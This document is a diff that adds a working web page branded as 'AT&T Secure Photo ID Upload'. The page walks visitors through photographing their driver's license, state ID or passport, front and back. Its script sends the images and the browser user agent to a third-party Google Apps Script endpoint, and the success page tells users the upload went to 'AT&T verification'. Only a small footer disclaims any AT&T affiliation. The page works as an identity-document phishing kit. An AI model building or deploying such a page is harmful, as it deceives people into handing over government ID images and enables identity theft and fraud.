@@ -1,0 +1,372 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover" />
+  <title>AT&T Secure ID Upload</title>
+  <meta name="theme-color" content="#00A8E0" />
+  <style>
+    :root{
+      --att-blue:#00A8E0; /* AT&T Cyan */
+      --att-navy:#004B70;
+      --att-ink:#172B3A;
+      --att-gray:#F4F6F8;
+      --green:#16A34A;
+      --red:#DC2626;
+      --radius:18px;
+      --shadow:0 10px 24px rgba(0,0,0,.08);
+    }
+    *{box-sizing:border-box}
+    body{margin:0;font-family:system-ui,-apple-system,Segoe UI,Roboto,Helvetica,Arial,sans-serif;background:#fff;color:var(--att-ink)}
+    .wrap{max-width:940px;margin:0 auto;padding:24px}
+    header{display:flex;gap:12px;align-items:center;padding:18px 0}
+    .logo{width:38px;height:38px;border-radius:50%;background:radial-gradient(circle at 30% 30%,#fff 0 25%, var(--att-blue) 26% 100%);box-shadow:inset 0 0 0 2px rgba(255,255,255,.9), 0 2px 10px rgba(0,0,0,.12)}
+    h1{font-size:clamp(20px,2.6vw,28px);margin:0;color:var(--att-navy)}
+    .card{background:#fff;border-radius:var(--radius);box-shadow:var(--shadow);padding:22px}
+    .cta{display:inline-flex;align-items:center;gap:10px;background:var(--att-blue);color:#fff;border:none;padding:14px 18px;border-radius:14px;font-weight:600;cursor:pointer}
+    .cta[disabled]{opacity:.6;cursor:not-allowed}
+    .link{color:var(--att-blue);text-decoration:none}
+    .muted{color:#5a6b79}
+    .steps{display:flex;gap:8px;flex-wrap:wrap;margin:6px 0 18px}
+    .chip{padding:8px 12px;border-radius:999px;background:var(--att-gray);font-weight:600}
+    .chip.active{background:rgba(0,168,224,.14);color:var(--att-navy);outline:2px solid var(--att-blue)}
+    .grid{display:grid;gap:18px}
+    @media(min-width:720px){.grid{grid-template-columns:repeat(3,1fr)}}
+    .option{border:2px solid var(--att-gray);border-radius:16px;padding:16px;cursor:pointer;transition:.2s}
+    .option:hover{border-color:var(--att-blue);box-shadow:0 6px 16px rgba(0,0,0,.06)}
+    .hidden{display:none !important}
+    .tabs{display:flex;border:1px solid var(--att-gray);border-radius:12px;overflow:hidden}
+    .tab{flex:1;text-align:center;padding:10px;font-weight:700;background:#fff;cursor:not-allowed}
+    .tab.active{background:var(--att-gray);}
+    .camera-wrap{display:grid;gap:12px}
+    video, canvas, img.preview{width:100%;border-radius:12px;background:#000;min-height:240px}
+    .btn-row{display:flex;gap:10px;flex-wrap:wrap}
+    .btn{padding:12px 16px;border-radius:12px;border:2px solid var(--att-gray);background:#fff;font-weight:700;cursor:pointer}
+    .btn.primary{background:var(--att-blue);border-color:var(--att-blue);color:#fff}
+    .btn.success{background:var(--green);border-color:var(--green);color:#fff}
+    .notice{padding:12px;border-left:4px solid var(--att-blue);background:rgba(0,168,224,.08);border-radius:10px}
+    .success-icon{width:64px;height:64px;border-radius:50%;display:grid;place-items:center;background:#EAF7EE;color:#0E7A3E;margin:0 auto 14px}
+    footer{padding:28px 0;color:#6b7b88;font-size:14px}
+    .sr-only{position:absolute;width:1px;height:1px;padding:0;margin:-1px;overflow:hidden;clip:rect(0,0,0,0);white-space:nowrap;border:0}
+  </style>
+</head>
+<body>
+  <div class="wrap">
+    <header>
+      <div class="logo" aria-hidden="true"></div>
+      <h1>AT&T Secure Photo ID Upload</h1>
+    </header>
+
+    <!-- PROGRESS -->
+    <div class="steps" aria-label="Progress">
+      <div class="chip" id="step1chip">1 · Consent</div>
+      <div class="chip" id="step2chip">2 · ID Type</div>
+      <div class="chip" id="step3chip">3 · Capture</div>
+      <div class="chip" id="step4chip">4 · Submitted</div>
+    </div>
+
+    <!-- STEP 1: CONSENT -->
+    <section id="step1" class="card">
+      <h2>Consent to Capture & Upload</h2>
+      <p class="muted">To verify your account, we need to capture a clear photo of your government‑issued ID. By checking the box below, you agree that:</p>
+      <ul>
+        <li>The photos are yours to share and match the account holder.</li>
+        <li>We will securely upload the images for verification and keep them only as long as necessary.</li>
+      </ul>
+      <label style="display:flex;gap:10px;align-items:flex-start;margin:16px 0">
+        <input id="consent" type="checkbox" />
+        <span>I agree to the <a class="link" href="#" onclick="alert('Example Terms of Use. Replace with your own link.');return false;">terms</a> and allow camera access to capture my ID.</span>
+      </label>
+      <button id="toStep2" class="cta" disabled>
+        Continue
+        <svg width="18" height="18" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true"><path d="M5 12h14M13 5l7 7-7 7" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg>
+      </button>
+    </section>
+
+    <!-- STEP 2: ID TYPE -->
+    <section id="step2" class="card hidden">
+      <h2>Select your ID type</h2>
+      <div class="grid" role="list">
+        <div class="option" role="button" tabindex="0" data-idtype="driver_license">
+          <strong>Driver's License</strong>
+          <p class="muted">Capture front then back.</p>
+        </div>
+        <div class="option" role="button" tabindex="0" data-idtype="state_id">
+          <strong>State ID</strong>
+          <p class="muted">Capture front then back.</p>
+        </div>
+        <div class="option" role="button" tabindex="0" data-idtype="passport">
+          <strong>Passport</strong>
+          <p class="muted">Capture the photo page.</p>
+        </div>
+      </div>
+      <div style="margin-top:16px"><button class="btn" id="backTo1">Back</button></div>
+    </section>
+
+    <!-- STEP 3: CAPTURE -->
+    <section id="step3" class="card hidden">
+      <div class="notice" id="captureNotice">Allow camera access when prompted. Use a well‑lit area and avoid glare.</div>
+      <h2 id="captureTitle">Capture your ID</h2>
+
+      <div id="tabs" class="tabs hidden" role="tablist" aria-label="Capture tabs">
+        <div id="tabFront" class="tab active" role="tab" aria-selected="true">Front</div>
+        <div id="tabBack" class="tab" role="tab" aria-selected="false">Back</div>
+      </div>
+
+      <div class="camera-wrap" style="margin-top:12px">
+        <div id="liveWrap">
+          <video id="video" playsinline autoplay muted class="hidden"></video>
+          <img id="filePreview" class="preview hidden" alt="Preview" />
+          <canvas id="canvas" class="hidden"></canvas>
+        </div>
+
+        <div class="btn-row">
+          <button class="btn" id="btnStartCam" title="Start camera">Open Camera</button>
+          <button class="btn" id="btnCapture" disabled>Capture</button>
+          <button class="btn primary" id="btnUse" disabled>Use This</button>
+          <label class="btn" for="fileInput" id="fileLabel">Upload from device</label>
+          <input id="fileInput" class="sr-only" type="file" accept="image/*" capture="environment" />
+        </div>
+
+        <div class="btn-row">
+          <button class="btn" id="btnRetake" disabled>Retake</button>
+          <button class="btn success" id="btnSubmit" disabled>Submit</button>
+          <button class="btn" id="btnBackType">Back</button>
+        </div>
+
+        <p class="muted" id="status"></p>
+      </div>
+    </section>
+
+    <!-- STEP 4: SUCCESS -->
+    <section id="step4" class="card hidden" aria-live="polite">
+      <div class="success-icon">
+        <svg width="36" height="36" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true"><path d="M20 6L9 17l-5-5" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"/></svg>
+      </div>
+      <h2>ID Submitted Successfully</h2>
+      <p class="muted">Thank you. Your images have been securely uploaded to AT&T verification.</p>
+      <div style="margin-top:12px">
+        <a class="link" href="#" onclick="location.reload();return false;">Submit another ID</a>
+      </div>
+    </section>
+
+    <footer>
+      <small>© <span id="year"></span> AT&T‑style demo. Not affiliated with AT&T. For internal verification flow use only.</small>
+    </footer>
+  </div>
+
+<script>
+(function(){
+  const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbx4h9eN9CvbUHVwyTtQsXjHow-65YQ3YJE6XamHdJTAwAPz60eXS9TpVdeOa6b5bMVinw/exec"; // <-- Your Apps Script endpoint
+
+  const $ = (id)=>document.getElementById(id);
+  const stepEls = [$("step1"), $("step2"), $("step3"), $("step4")];
+  const chips = [$("step1chip"), $("step2chip"), $("step3chip"), $("step4chip")];
+  const consent = $("consent");
+  const toStep2 = $("toStep2");
+  const backTo1 = $("backTo1");
+  const statusEl = $("status");
+
+  const tabs = $("tabs"), tabFront = $("tabFront"), tabBack = $("tabBack");
+  const video = $("video"), canvas = $("canvas"), fileInput = $("fileInput"), filePreview = $("filePreview");
+  const btnStartCam = $("btnStartCam"), btnCapture = $("btnCapture"), btnUse = $("btnUse"), btnRetake = $("btnRetake"), btnSubmit = $("btnSubmit"), btnBackType = $("btnBackType");
+  const captureTitle = $("captureTitle"), captureNotice = $("captureNotice");
+
+  let stream = null;
+  let idType = null; // 'driver_license' | 'state_id' | 'passport'
+  let side = 'front';
+  let shots = { front:null, back:null, passport:null };
+
+  // UTIL
+  const goto = (n)=>{
+    stepEls.forEach((el,i)=> el.classList.toggle('hidden', i!==n));
+    chips.forEach((c,i)=> c.classList.toggle('active', i===n));
+    window.scrollTo({top:0, behavior:'smooth'});
+  }
+  const setStatus = (msg)=> statusEl.textContent = msg || '';
+  const stopStream = ()=>{ if(stream){ stream.getTracks().forEach(t=>t.stop()); stream=null; }}
+  const startStream = async ()=>{
+    setStatus('Requesting camera…');
+    btnStartCam.disabled = true;
+    try{
+      // Prefer back camera.
+      const constraintsA = { video: { facingMode: { exact:'environment' } }, audio:false };
+      const constraintsB = { video: { facingMode: 'environment' }, audio:false };
+      const constraintsC = { video: true, audio:false };
+      try { stream = await navigator.mediaDevices.getUserMedia(constraintsA); }
+      catch(e1){ try { stream = await navigator.mediaDevices.getUserMedia(constraintsB); }
+      catch(e2){ stream = await navigator.mediaDevices.getUserMedia(constraintsC); }}
+      video.srcObject = stream;
+      video.classList.remove('hidden');
+      btnCapture.disabled = false;
+      setStatus('Camera ready. Hold steady and tap Capture.');
+    }catch(err){
+      setStatus('Camera access failed. You can upload a photo instead.');
+      btnStartCam.disabled = false;
+    }
+  }
+  const dataURLToBlob = (dataURL)=>{
+    const [header, data] = dataURL.split(',');
+    const mime = header.match(/:(.*?);/)[1];
+    const bin = atob(data); const len = bin.length; const u8 = new Uint8Array(len);
+    for(let i=0;i<len;i++) u8[i]=bin.charCodeAt(i);
+    return new Blob([u8], {type:mime});
+  }
+  const downscaleToJpeg = async (imgOrVideo)=>{
+    const MAX_W = 1600; // balance quality/size
+    const r = imgOrVideo.videoWidth || imgOrVideo.naturalWidth || 1280;
+    const h = imgOrVideo.videoHeight || imgOrVideo.naturalHeight || 720;
+    const scale = Math.min(1, MAX_W / r);
+    const W = Math.round(r*scale), H = Math.round(h*scale);
+    canvas.width = W; canvas.height = H; canvas.getContext('2d').drawImage(imgOrVideo, 0, 0, W, H);
+    const data = canvas.toDataURL('image/jpeg', 0.9);
+    return dataURLToBlob(data);
+  }
+
+  // STEP 1
+  consent.addEventListener('change', ()=>{ toStep2.disabled = !consent.checked; });
+  toStep2.addEventListener('click', ()=>{ goto(1); });
+
+  // STEP 2
+  backTo1.addEventListener('click', ()=>{ goto(0); });
+  document.querySelectorAll('.option').forEach(card=>{
+    card.addEventListener('click', ()=>{
+      idType = card.dataset.idtype;
+      side = (idType==='passport') ? 'passport' : 'front';
+      captureTitle.textContent = (idType==='passport') ? 'Capture your Passport photo page' : `Capture ${side} of your ${idType.replace('_',' ')}`;
+      tabs.classList.toggle('hidden', idType==='passport');
+      tabFront.classList.add('active'); tabBack.classList.remove('active');
+      resetCaptureUI();
+      goto(2);
+    });
+  });
+
+  // CAPTURE UI helpers
+  function resetCaptureUI(){
+    stopStream();
+    video.classList.add('hidden');
+    filePreview.classList.add('hidden');
+    btnCapture.disabled = true; btnUse.disabled = true; btnRetake.disabled = true; btnSubmit.disabled = true;
+    setStatus('Tap Open Camera or Upload from device.');
+    btnStartCam.disabled = false;
+    fileInput.value = '';
+  }
+
+  // Tabs (view only; we auto-advance) — disabled clicking to enforce order
+  tabFront.addEventListener('click', ()=>{});
+  tabBack.addEventListener('click', ()=>{});
+
+  // Camera controls
+  btnStartCam.addEventListener('click', startStream);
+  btnCapture.addEventListener('click', async ()=>{
+    if(!video.srcObject){ setStatus('Camera not started.'); return; }
+    btnCapture.disabled = true;
+    try{
+      const blob = await downscaleToJpeg(video);
+      const url = URL.createObjectURL(blob);
+      filePreview.src = url; filePreview.classList.remove('hidden');
+      video.classList.add('hidden');
+      btnUse.disabled = false; btnRetake.disabled = false;
+      setStatus('Review your capture. Choose Use This or Retake.');
+      // Temporarily stash on the element for retake flow
+      filePreview._blob = blob;
+    }catch(e){ setStatus('Could not capture frame. Try again.'); btnCapture.disabled=false; }
+  });
+
+  btnUse.addEventListener('click', ()=>{
+    const blob = filePreview._blob;
+    if(!blob){ setStatus('No image to use.'); return; }
+    saveShot(blob);
+  });
+
+  btnRetake.addEventListener('click', ()=>{
+    filePreview._blob = null;
+    filePreview.classList.add('hidden');
+    video.classList.remove('hidden');
+    btnUse.disabled = true; btnRetake.disabled = true; btnCapture.disabled = false;
+    setStatus('Retake ready.');
+  });
+
+  // File upload fallback
+  fileInput.addEventListener('change', async (e)=>{
+    const f = e.target.files[0]; if(!f) return;
+    setStatus('Processing image…');
+    const img = new Image();
+    img.onload = async ()=>{
+      const blob = await downscaleToJpeg(img);
+      const url = URL.createObjectURL(blob);
+      filePreview.src = url; filePreview.classList.remove('hidden');
+      video.classList.add('hidden');
+      btnUse.disabled = false; btnRetake.disabled = false; btnCapture.disabled = true;
+      filePreview._blob = blob;
+      setStatus('Image ready. Choose Use This.');
+    }
+    img.src = URL.createObjectURL(f);
+  });
+
+  function saveShot(blob){
+    const filename = `${idType}_${side}_${Date.now()}.jpg`;
+    const file = new File([blob], filename, { type:'image/jpeg' });
+    if(idType==='passport'){
+      shots.passport = file;
+      btnSubmit.disabled = false;
+      setStatus('Ready to submit passport photo.');
+    } else if(side==='front'){
+      shots.front = file;
+      // move to back side
+      side = 'back';
+      tabFront.classList.remove('active');
+      tabBack.classList.add('active');
+      captureTitle.textContent = `Capture back of your ${idType.replace('_',' ')}`;
+      resetCaptureUI();
+      // auto open camera for convenience
+      setTimeout(()=>btnStartCam.click(), 300);
+    } else {
+      shots.back = file;
+      btnSubmit.disabled = false;
+      setStatus('Both sides captured. Submit when ready.');
+    }
+  }
+
+  // Submit to Apps Script
+  btnSubmit.addEventListener('click', async ()=>{
+    try{
+      btnSubmit.disabled = true; btnRetake.disabled = true; btnBackType.disabled = true;
+      setStatus('Uploading securely…');
+      const fd = new FormData();
+      fd.append('idType', idType);
+      fd.append('userAgent', navigator.userAgent);
+      if(idType==='passport'){
+        if(!shots.passport) throw new Error('No passport image');
+        fd.append('passport', shots.passport, shots.passport.name);
+      } else {
+        if(!shots.front || !shots.back) throw new Error('Missing front/back');
+        fd.append('front', shots.front, shots.front.name);
+        fd.append('back', shots.back, shots.back.name);
+      }
+
+      const res = await fetch(SCRIPT_URL, { method:'POST', body: fd });
+      if(!res.ok){
+        const t = await res.text();
+        throw new Error(`Server error: ${res.status} ${t}`);
+      }
+      const json = await res.json().catch(()=>({ ok:true }));
+      console.log('Server response', json);
+      goto(3); // success page
+    }catch(err){
+      console.error(err);
+      setStatus('Upload failed: '+ err.message);
+      btnSubmit.disabled = false; btnBackType.disabled = false;
+    }
+  });
+
+  // Nav
+  btnBackType.addEventListener('click', ()=>{ stopStream(); goto(1); });
+
+  // Wire up step chips initially
+  goto(0);
+  document.getElementById('year').textContent = new Date().getFullYear();
+})();
+</script>
+</body>
+</html>
